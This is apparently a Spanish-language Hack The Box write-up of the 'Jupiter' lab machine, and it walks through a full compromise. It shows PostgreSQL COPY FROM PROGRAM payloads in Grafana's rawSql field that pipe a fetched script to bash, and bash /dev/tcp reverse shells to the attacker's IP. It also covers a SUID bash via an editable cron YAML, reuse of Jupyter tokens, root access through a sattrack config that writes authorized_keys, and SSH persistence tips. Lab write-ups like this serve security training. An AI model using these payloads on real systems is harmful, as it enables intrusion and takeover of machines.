---
layout: post
title: HTB Jupiter
date: '2023-11-09 07:34:15 -0500'
categories: [HTB, Medium]
tags: [Web, CVE, Postgres, RCE, Jupyter, Python, Linux , SQLI, API, Cronjob, Sattrack , Sudoers , Binary, SSH  ]
image:
  path: /jupiter/preview.jpeg
  alt: Jupiter
---

## Resumen
![logo](/jupiter/logo.png){: .right w="200" h="200" }
**Jupiter** consiste en realizar un **reconocimiento** en una página **web** hasta encontrar un **subdominio** que esté ejecutando un servicio de **Grafana**. Este servicio realiza consultas un tanto curiosas a la **base de datos**. Al analizar una de ellas, se descubre que es vulnerable a una inyección de **comandos** dentro del host. Una vez dentro de la máquina, se observa que hay **tareas** que se ejecutan periódicamente gracias a **pspy**. Por lo tanto, se puede abusar de una de ellas para ganar acceso como otro usuario.

Posteriormente, se logra acceder a unos **logs** que contienen **tokens de autenticación**. Sorprendentemente, se descubre que hay un servicio de **Jupyter** corriendo en la máquina, lo que permite autenticarse y seguir escalando privilegios. Finalmente, se llega al punto culminante de la máquina, en el cual se debe abusar del **software de rastreo de satélites "sattrack"**. Con esto, se logra ganar acceso a la máquina al añadir la llave pública **RSA** como **authorized key**.

Hasta el momento, esta ha sido una de mis máquinas favoritas. Fue bastante divertida y muy útil para practicar una gran cantidad de temáticas que la componen.

## Reconocimiento


Para empezar, se realiza un ping para determinar con qué sistema operativo cuenta la máquina.

```bash
❯ ping -c 1 10.10.11.216
PING 10.10.11.216 (10.10.11.216) 56(84) bytes of data.
64 bytes from 10.10.11.216: icmp_seq=1 ttl=63 time=386 ms

--- 10.10.11.216 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 386.228/386.228/386.228/0.000 ms
```
{: .nolineno}
## Escaneo de Puertos

Al saber que es **Linux**, se puede intentar verificar qué puertos están abiertos dentro de la máquina.

```bash
❯ sudo nmap -p- --min-rate 2000 10.10.11.216 -oG openPorts -Pn -sS

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
{: .nolineno}

Al identificar los puertos, se desea realizar un escaneo más detallado de los mismos.

```bash
❯ nmap -p22,80 -sVC --min-rate 2000 10.10.11.216 -oN VersionPorts -Pn

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA)
|_  256 6001d7db927b13f0ba20c6c900a71b41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Home | Jupiter
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
## Enumeración


Al revisar en la web, se observa que es necesario registrar el dominio dentro del archivo **/etc/hosts**.

![etchost](/jupiter/etchost.png)

```bash
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.11.226 jupiter.htb
```
{: .nolineno}

Se puede ver lo siguiente en la **web**

![web](/jupiter/web.png)

Teniendo en cuenta esto, podrían existir subdominios relacionados con ***jupiter.htb***. Por lo tanto, se puede revisar con **Gobuster** para identificar cuáles de ellos están presentes.

```bash
❯ gobuster vhost -u http://jupiter.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200

===============================================================
2023/10/18 11:32:21 Starting gobuster in VHOST enumeration mode
===============================================================
Found: kiosk.jupiter.htb (Status: 200) [Size: 34390]
```
{: .nolineno}

Al revisarlo, se encuentra un servicio de **Grafana**.

![grafana](/jupiter/grafana.png)


Con esta información en mente, se puede intentar revisar las solicitudes dentro de la web para tratar de obtener algún tipo de información. Hay varias solicitudes que se repiten y parecen traer datos relevantes.

![requests](/jupiter/request.png)


Al investigar sobre **/ds/query** aparece lo siguiente:

> [Query a data source](https://grafana.com/docs/grafana/latest/developers/http_api/data_source/#query-a-data-source)                                  
Queries a data source having a backend implementation.
`POST /api/ds/query`
{: .prompt-info}

Por lo que parece, se está realizando una comunicación con el **backend**. Al revisar la petición, se está ejecutando un comando de **POSTGRES**, por lo que se puede intentar investigar algo.

### Nota

Se pueden ejecutar comandos dentro de la base de datos.

![postgrescommand](/jupiter/postgrescommand.png)

## Explotación

Con relación a lo anterior, existe un **CVE** que permite la ejecución de comandos desde la base de datos, s, **[CVE-2019–9193](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193)** , por lo que se puede utilizar el siguiente payload:

```sql
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```
{: .nolineno}

Como ya se sabe que el campo rawSql es vulnerable, se puede intentar añadir el payload ahí para que consuma un servicio propio.

```postgresql
"rawSql":"DROP TABLE IF EXISTS cmd_exec;  CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'curl http://10.10.15.135:8081/hola' " 
```
Y se puede montar un servidor en Python para recibir la petición.

```bash
❯ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.216 - - [18/Oct/2023 11:55:58] code 404, message File not found
10.10.11.216 - - [18/Oct/2023 11:55:58] "GET /hola HTTP/1.1" 404 -
```
{: .nolineno}


Con esto en mente, se puede lograr que se consuma un archivo y se interprete como bash al realizarle curl.

```bash
#!/bin/bash
bash -c "/bin/bash -i >& /dev/tcp/10.10.15.135/4444 0>&1"
```
{: file="shell.sh"}


Se pone a la escucha con NC:

```bash
nc -lvp 4444
```
{: .nolineno}
Y se crea el payload correspondiente:

```sql
"rawSql":"DROP TABLE IF EXISTS cmd_exec;  CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'curl http://10.10.15.135:8081/shell.sh | bash';"
```
{: .nolineno}
Con eso se obtiene una **shell reversa dentro de la víctima como el usuario postgres**.

```bash
postgres@jupiter:/tmp$ whoami
postgres
```
{: .nolineno}
## Escalada de Privilegios (Juno)

Al revisar los comandos que se ejecutan de forma periódica con **pspy**, se observa que existe una tarea que se ejecuta frecuentemente, ejecutada por el usuario **juno** y relacionada con el archivo ***/dev/shm/network-simulation.yml***. Al examinar el archivo, se nota que cuenta con permisos de lectura y escritura, por lo que se puede intentar modificarlo para asumir la identidad de otro usuario.

El archivo sería el siguiente:

```yml
hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```
{: file="/dev/shm/network-simulation.yml"}

Por lo que se puede inferir, se están ejecutando comandos, por lo que se puede intentar cambiarlos para crear una copia de la **/bin/bash** con permisos **SUID** como **juno**.

```yml
hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash  /tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod 
      args: u+s /tmp/bash
      start_time: 5s
```
{: file="/dev/shm/network-simulation.yml"}

Con eso, solo hace falta ejecutar el archivo creado:
```bash
./bash -p
```
{: .nolineno}
Y se obtiene una shell.

```bash
juno@jupiter:~$ ls
shadow  shadow-simulation.sh  user.txt
juno@jupiter:~$ 
```
{: .nolineno}
### Nota

>Un buen consejo es intentar asegurar la permanencia dentro de la máquina para que se pueda acceder en cualquier momento, incluso si la conexión se llega a perder. Esto se puede lograr copiando la clave pública de **SSH** dentro de la máquina.
{: .prompt-tip}

```bash
ssh -i id_rsa juno@10.10.11.216
```
{: .nolineno}
## Escalada de Privilegios (Jovian)


Al revisar qué puertos se encuentran abiertos dentro de la máquina, se puede observar que el ***puerto 8888*** es llamativo. Por lo tanto, se puede intentar realizar un **port forwarding** para ver qué sucede dentro de la máquina. Se puede hacer fácilmente gracias a que se puede establecer una conexión **SSH**, por lo que se utiliza el siguiente comando:

```bash
ssh -i id_rsa juno@10.10.11.216 -L 8888:127.0.0.1:8888
```
{: .nolineno}
Y al revisar el puerto, se puede ver lo siguiente:

![jupiter](/jupiter/jupyter.png)

>Jupyter Notebook se usa para visualizar datos en big data y data science. Jupyter Notebook es una aplicación web de código abierto. Cada desarrollador puede dividir el código en partes y trabajar en ellas sin importar el orden: escribir, probar funciones, cargar un archivo en la memoria y procesar el contenido.
{: .prompt-info}

Un punto importante es que, según la información proporcionada por la web de **Jupyter**, se puede acceder a la cuenta mediante el uso de la contraseña o del **token de autenticación**. Por lo tanto, se debe tener en cuenta esto último.

Ahora, lo que se puede hacer es revisar en qué **grupos** se encuentra el usuario, por si hay algo llamativo.


```bash
juno@jupiter:~$ id
uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
```
{: .nolineno}
El grupo **"science"** no es algo habitual, por lo que se puede revisar qué **archivos** están vinculados a este grupo.


```bash
find / -group science 2>/dev/null
/opt/solar-flares/logs
/opt/solar-flares/logs/jupyter-2023-03-10-25.log
/opt/solar-flares/logs/jupyter-2023-03-08-37.log
/opt/solar-flares/logs/jupyter-2023-03-08-38.log
/opt/solar-flares/logs/jupyter-2023-03-08-36.log
/opt/solar-flares/logs/jupyter-2023-03-09-11.log
/opt/solar-flares/logs/jupyter-2023-03-09-24.log
/opt/solar-flares/logs/jupyter-2023-03-08-14.log
/opt/solar-flares/logs/jupyter-2023-03-09-59.log
/opt/solar-flares/flares.html
```
{: .nolineno}

Dentro de algunos de los archivos, se puede ver la palabra "token" acompañada de una cadena que se puede asumir que es el **token**.


```bash
 To access the notebook, open this file in a browser:
        file:///home/jovian/.local/share/jupyter/runtime/nbserver-945-open.html
    Or copy and paste one of these URLs:
        http://localhost:8888/?token=ff0e0d45e2c953a0e942abc9008b03d728cf989ad9f93f9b
     or http://127.0.0.1:8888/?token=ff0e0d45e2c953a0e942abc9008b03d728cf989ad9f93f9b
```
{: .nolineno}

Con eso en mente, se puede realizar un comando `grep` a la cadena **?token=** dentro de los archivos para identificar cuáles pueden ser los posibles tokens.

```bash
grep -r "?token=" *
```
{: .nolineno}
Y se obtienen múltiples tokens, por lo que hay que probar con varios hasta obtener el válido.

Una vez con el acceso al cuadernillo, solo haría falta añadir un pequeño script en Python que ejecute una shell reversa hacia nuestra máquina de atacante.

```python
import os
os.system("bash -c '/bin/bash -i >& /dev/tcp/10.10.15.135/4443 0>&1'")
```

Pero antes de ejecutarlo, hay que ponerse a la escucha con `nc`:

```bash
nc -lvp 4443
```
{: .nolineno}

Con eso, se ha obtenido acceso como "jovian".

### Nota


>Recuerda aplicar la misma estrategia que antes para asegurar la permanencia dentro del sistema, copiando la clave pública de SSH u otras medidas de acceso futuro.
{: .prompt-tip}


## Escalada de Privilegios (Root)

Cuando se revisa la carpeta del usuario **jovian**, se puede observar que no hay nada, pero al utilizar el comando `sudo -l`, se nota que se puede ejecutar a nivel de ***sudoers***.


```bash
jovian@jupiter:~$ sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```
{: .nolineno}

> With sattrack you can track satellites in real time with antennas.
{: .prompt-info}


Pero al intentar ejecutarlo, se presenta el siguiente **error**:


```bash
jovian@jupiter:~$ /usr/local/bin/sattrack
Satellite Tracking System
Configuration file has not been found. Please try again!
jovian@jupiter:~$ 
```
{: .nolineno}

Y al revisar el contenido legible del binario con el comando `strings`, se puede notar que hace falta crear el archivo de configuración en la ruta **/tmp/config.json**.

```bash
jovian@jupiter:~$ strings /usr/local/bin/sattrack | grep config
/tmp/config.json
tleroot not defined in config
updatePerdiod not defined in config
```
{: .nolineno}

Dentro del [repositorio](https://github.com/arf20/arftracksat) repositorio se encuentra una detallada explicación de cómo debe estructurarse el archivo.


```bash
Value           Description
tleroot:        Location to get and load TLE files, must be writable by the user,
                note: this default will delete TLEs after reboot. Modification advised
tlefile:        TLE filename to load from tleroot
tlesources:     A array of URLs to curl get into tleroot
updatePerdiod:  Screen update period in milliseconds
station:        Station data
  name:           Name
  lat:            Geodetic latitude
  lon:            East longitude
  hgt:            Altitude (height) over sea level in meters
show:           Array to only show sats by name. Leave empty to show all (possibly not good performing)
columns:        Sat data to show in columns in order
                name, azel, dis, geo, tab, pos, vel

```
{: file="/tmp/config.json"}


El **ataque** consiste en poder ejecutarlo como **root** para consumir un archivo desde un servidor externo y guardarlo en una carpeta específica. En este caso, se toma la **llave pública** del atacante y se guarda en el directorio **/root/.ssh/** con el nombre **authorized_keys**. Con esto, se puede obtener acceso como root a la máquina mediante una conexión **SSH**.

> Después de algunas pruebas, me di cuenta de que para que funcione, el archivo que se consume y el que se crea deben tener el mismo nombre.
{: .prompt-tip}

```json
{
	"tleroot": "/root/.ssh/",
	"tlefile": "authorized_keys",
	"mapfile": "/usr/local/share/arftracksat/map.json",
	"texturefile": "/usr/local/share/arftracksat/earth.png",
	
	"tlesources": [
		"http://10.10.15.135:8081/authorized_keys"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}

```
{: file="/tmp/config.json"}

Y se ejecutó de forma adecuada. Al ejecutar el comando `sudo /usr/local/bin/sattrack`, se debería obtener la siguiente salida.

```bash
jovian@jupiter:/tmp$ sudo  /usr/local/bin/sattrack
Satellite Tracking System
Get:0 http://10.10.15.135:8081/authorized_keys
Satellites loaded
No sats
```
{: .nolineno}

Por lo que se puede obtener acceso al servidor gracias a la llave **id_rsa**.

```bash
ssh -i id_rsa root@10.10.11.216
```
{: .nolineno}

Y con eso se obtiene acceso total a la máquina :3 .


